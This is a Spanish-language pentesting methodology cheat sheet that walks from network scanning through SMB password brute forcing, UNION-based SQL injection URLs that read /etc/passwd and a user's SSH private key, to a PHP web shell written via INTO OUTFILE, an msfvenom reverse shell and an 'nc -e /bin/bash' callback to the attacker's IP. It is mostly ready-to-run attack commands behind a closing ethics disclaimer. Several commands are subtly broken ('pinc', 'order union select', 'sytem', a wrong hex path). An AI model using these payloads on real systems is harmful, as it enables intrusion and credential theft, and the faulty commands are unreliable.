# ***Pentesting: Methodology***

`Pentesting Methodology` este documento sirve para tener una metodología a la hora de hacer pentesting en empresas. Donde encontraras comandos para ayudarte rapidamente a realizar pentesting desde lo mas básico a lo avanzado.

> [!NOTE]
> Las direcciones IP o segmento que le corresponde al atacanque y a la victima son las siguiente:
> - VICTIMA = $${\color{red}192.168.0.0/24}$$	
> - ATACANTE = $${\color{lightgreen}192.168.10.0/24}$$	


## <ins>Fase 1: Enumeración</ins> (escaneo) 

#### 1.1. Verificar si está encendido.      
   ```bash
   pinc -c 1 192.168.0.10
   ```

#### 1.2. Tracert para ver porque nodos pasan, si el TTL es 64 corresponde a un Linux y si es 128 a Windows.      
   ```bash
   pinc -c 1 192.168.0.10 -R
   ```

#### 1.2. Mostrar las redes disponibles.      
   ```bash
   sudo netstat –rn 
   ```

#### 1.3. Escaneo de puertos TCP abiertos.      
   ```bash
   nmap -p- --open -T5 -v -n 192.168.0.10 -oG allPorts
   ```
  - _El parametro **T5** es temporizador de escaneo, mientras mas alto va mas rápido, **T0** es mas lento y **T5** es el tope, además es muy ruidoso no recomendado en escaneos reales ni en el excamen de  eJPT._
    
#### 1.4. Escaneo muy rapido (NO recomendado en pentesting reales).      
   ```bash
   nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 192.168.0.10 -oG allPorts
   ```
 - _El parametro **-sS** es tcp sync port scan, el parametro **--min--rate** controla el número de paquetes que se quiere enviar 5 mil x segundo, el parametro **-Pn** es para evitar descubrimientode host mediante resolución de nombres del protocolo ARP._

#### 1.5. Escaneo exhaustivo de puertos.      
   ```bash
   nmap -sC -sV -p22,80 192.168.0.10 -oN targeted
   ```


----------------------------------------------------------------------------

## <ins>Fase 2: Análisis de Vulnerabilidades</ins> 

### 2.1. Puerto 80 - HTTP

#### 2.1.1 Identificar el gestor de contenido web.      
   ```bash
   whatweb http://192.168.0.10
   ```
> [!TIP]
> También se puede identificar la tecnología web utilizando la extensión en Mozilla lamado: $${\color{lightgreen}Wappanalyzer}$$.
> https://addons.mozilla.org/es/firefox/addon/wappalyzer/

#### 2.1.2 Si existe un servidor web, aplicar fuerza bruta de directorio con nmap (por ejemplo, /admin, /login, /phpmyadmin, etc.).      
   ```bash
   nmap --script http-enum -p80 192.168.0.10 -oN webScan 
   ```

#### 2.1.3. Si existe una web en PHP, inyectar código en las entradas de usuario.      
   ```bash
   <?php system("whoami"); ?> 
   ```


### 2.2. Puerto 445 - SMB

#### 2.2.1. Es un servidor de dominio SMB, podemos identificar el sistema operativo, la versión en uso o su tipo de arquitectura.      
   ```bash
   crackmapexec smb 192.168.0.10
   ```

#### 2.2.2. Si se dectectó un nombre de dominio, agregarlo el nombre de dominio y la IP de la victima en $${\color{lightblue}/etc/hosts}$$      
   ```bash
   192.168.0.10     dominio.local
   ```

#### 2.2.3. Listar los recuros compartidos a nivel de red.      
   ```bash
   smbclient -L 192.168.0.10 -N
   ```

#### 2.2.4. Si el puerto 135 esta abierto, podemos probar con RPC client ya que es un controlador de dominio.      
   ```bash
   rpcclient -U "" 192.168.0.10 -N 
   rpcclient $> enumdomusers 
   result was NT_STATUS_ACCESS_DENIED  
   ```
   - _Si la respuesta de rpcclient es **ACEES_DENIED** significa que no se puede enumerar_

#### 2.2.5. Del sitio web podemos identificar algunos nombres de usuarios para reallizar fuerza bruta. Lo guardamos en un archivo llamado **users**.  
   ```bash
   crackmapexec smb 192.168.0.10 -u users -p users --continue-on-success | grep -v -i "failure"  
   ```
   - _Las contraseñas serán las mismas que los nombres de usuarios._

#### 2.2.6. Generar diccionario de contraseñas con la información del sitio web de forma automática y lo guardamos en un fichero llamado **passwords**.  
   ```bash
   cewl -w passwords http://domail.local/..../ --with-numbers   
   ```

   - _Ahora usamos ese fichero._
   ```bash
   crackmapexec smb 192.168.0.10 -u users -p passwords --continue-on-success | grep -v -i "failure"

   SMB     192.168.0.10     445     FUSE    [-] domain.local\nombre_usuario:contraseña STATUS_PASSWORD_MUST_CHANGE 
   ```

  - _Si nos aparece el mensaje **STATUS_PASSWORD_MUST_CHANGE** significa que la contraseña es válida y podemos cambiar la contraseña._
   ```bash
   smbpasswd -r 192.168.0.10 -U "nombre_usuario" 

Old SMB password: contraseña
   ```

#### 2.2.7. Probar nuevamente enumerar recursos compartidos con fuerza bruta.  
   ```bash
   crackmapexec smb 192.168.0.10 -u "nombre_usuario" -p "contraseña_nueva"  
   ```

#### 2.2.8. Ahora como ya se tiene contraseñas validas se puede hacer rpcclient.  
   ```bash
   rpcclient -U 'nombre_usuario%contraseña_nueva' 192.168.0.10 

rpcclient $> enumdomusers 
rpcclient $> enumprinters    
   ```

#### 2.2.9. Probar acceso sobre la administración remota de Windows.  
   ```bash
   crackmapexec winrm 192.168.0.10 -u 'nombre_usuario' -p 'contraseña' 

WINRM    192.168.0.10     5985     FUSE    [-] domain.local\nombre_usuario:contraseña (Pwn3d!)     
   ```

#### 2.2.11. Si en la respuesta nos aparece **Pwned** significa que tenemos privilegios.  Teniendo acceso remoto vemos si podemos acceder al directorio del administrador. 
   ```bash
   evil-winrm -i 192.168.0.10 -u 'nombre_usuario' -p 'contraseña'

    *Evil-WinRM* PS C:\Users\nombre_usuario\Desktop> cd C:\Users\Administrator
   ```
   - _Si no se puede acceder al directorio del administrador intentar a directorio temporal: **cd C:\Windows\Temp**_
   ```bash
   *Evil-WinRM* PS C:\Windows\Temp> whoami /priv
   ```
   - _Con **whoami /priv** enumeramos los privilegios del usuario con el que tenemos la contraseña. Si queremos ver mas información usar el comando **whoami /all**._

#### 2.2.12. Compartir archivos de Windows a Linux en cmd
   - _En Windows escribir el primer comando y en linux el segundo comando._
   ```bash
     python -m http.server 
   ```
   ```bash
     wget http://192.168.0.10:8000/nombre_archivo 
   ```

### 2.3. SQLi - MySQL

#### 2.3.1 Metodo GET en la URL.      
   ```bash
   http://192.168.0.10/room.php?cod=-1
   ```
   - _A partir de **cod=-1** se puede inyectar SQL_

#### 2.3.2 **Order by**, para identificar cuantas columnas tiene el Query.  
   ```bash
   http://192.168.0.10/room.php?cod=-1 order by 7-- - 
   ```

#### 2.3.3 **Union**, una vez identificado la cantidad de columnas probamos lo siguiente.  

   - _Si en la pagina aparece algun numero entonces es vulnerable_
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,3,4,5,6,7-- - 
   ```
   - _Por ejemplo el número 3 aparece en el sitio web, entonces corroboramos con inyectar una palabra_
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,"test",4,5,6,7-- -   
   ```
   - _Mostar el nombre de la base de datos o versión o usuarios._
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,database(),4,5,6,7-- -   
   ```
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,version(),4,5,6,7-- -      
   ```
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,user(),4,5,6,7-- -       
   ```
 - _Leer archivos de la maquina victima, listar puertos internos o listar usuarios._
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,load_file("/etc/passwd"),4,5,6,7-- -      
   ```
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,load_file("/proc/net/tcp"),4,5,6,7-- -      
   ```
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,load_file("/proc/net/fib_trie"),4,5,6,7-- -      
   ```
- _Leer archivos de la maquina victima, en formato ofuscado convertiendolo a hexadecimal. Agregamos **0x** adelante del hexadecimal._
   ```bash
   echo "/etc/passwd" | tr -d '\n' | xxd -ps  

   2f6574632f786173737764       
   ```
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,load_file(0x2f6574632f786173737764),4,5,6,7-- -         
   ```
- _Listar el RSA SSH del usuario que tenga bash, esto lo sabemos leeyendo primero el archivo /etc/passwd._
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,load_file("/home/nombre_usuario/.ssh/id_rsa"),4,5,6,7-- -        
   ```

#### 2.3.4 Enumerar **nombres de la base de datos**.  

   - _Enumerar esquemas_
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,schema_name,4,5,6,7 from information_schema.schemata-- - 
   ```
 - _Asignado limites en la enumaración. Va incrementado **limit n,1**_
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 0,1-- -  
   ```
    ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 1,1-- -  
   ```  

#### 2.3.5 Enumerar **tablas de la base de datos**, podemos usar nuevamente limit.  

   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,table_name,4,5,6,7 from information_schema.tables where table_schema="nombre_bd" limit 0,1-- -  
   ```
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,table_name,4,5,6,7 from information_schema.tables where table_schema="nombre_bd" limit 1,1-- -  
   ```

#### 2.3.6 Enumerar **columnas de la tabla de la base de datos**, podemos usar nuevamente limit.  

   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_schema="nombre_bd" and table_name="nombre_tabla" limit 0,1-- -   
   ```
   ```bash
      http://192.168.0.10/room.php?cod=-1 order union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_schema="nombre_bd" and table_name="nombre_tabla" limit 1,1-- -  
   ```

#### 2.3.6 **Group concat** para agrupar y concatenar en una sola fila.  

   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,group_concat(column_name),4,5,6,7 from information_schema.columns where table_schema="nombre_bd" and table_name="nombre_tabla" limit 3,1-- -    
   ```

#### 2.3.7 Carga de archivos.  

   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,"Hola esto es una prueba",4,5,6,7 into outfile "/var/www/html/probando.txt"-- -     
   ```
   - _Validar si cargó el archivo http://192.168.0.10/probando.txt, significa que la ruta /var/www/html es correcta y se tiene capacidad de escritura._







----------------------------------------------------------------------------


## <ins>Fase 3: Explotación</ins> 

#### 3.1 Crear una revershell.      
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.10.1 LPORT:443 -f exe -o reverse.exe
   ```

### 3.2. SQLi - MySQL

#### 3.2.1 Enviar una Shell PHP.  

   - _Con esto el servidor nos ejecutara el comando que nos interesa en la URL solo le pasamos en comando: http://192.168.0.10/shell.php?**cmd=id**_
   ```bash
   http://192.168.0.10/room.php?cod=-1 order union select 1,2,"<?php sytem($_REQUEST['cmd']); ?>",4,5,6,7 into outfile "/var/www/html/shell.php"-- - 
   ```
   - _Entablamos una revershell y desde Kali nos ponemos en escucha **nc -nlvp 443**_
   ```bash
   http://192.168.0.10/shell.php?cmd=nc -e /bin/bash 192.168.10.1 443   
   ```
   - _Estando conectados lanzamos una shell mas interactiva_
   ```bash
   script /dev/null -c bash   
   ```
   - _Tratamiento a la tty, presionamos control+z para salir del puerto en escucha y ejecutamos_
   ```bash
   stty raw -echo; fg (enter) 
   reset (para reiniciar la configuración de la terminal) 
   xterm (tipo de terminal) 
   export TERM=xterm (exportamos variable de entorno) 
   export SHELL=bash (exportamos variable de entorno) 
   ```
#### 3.2.2 Buscar exploit en phpmyadmin.  
   ```bash
   searchsploit phpmyadmin 4.8 
   ```








> [!Warning]
> 
> ### DISCLAIMER
> Este documento está destinado únicamente para fines educativos y de hacking ético. Sólo debe utilzarse para probar sistemas de su propiedad o para los que tenga permiso explícito para probar. El uso no autorizado de sitios web o sistemas de terceros sin consentimiento es ilegal y poco ético.







> [!IMPORTANT]
> Crucial information necessary for users to succeed.

> [!CAUTION]
> Negative potential consequences of an action.



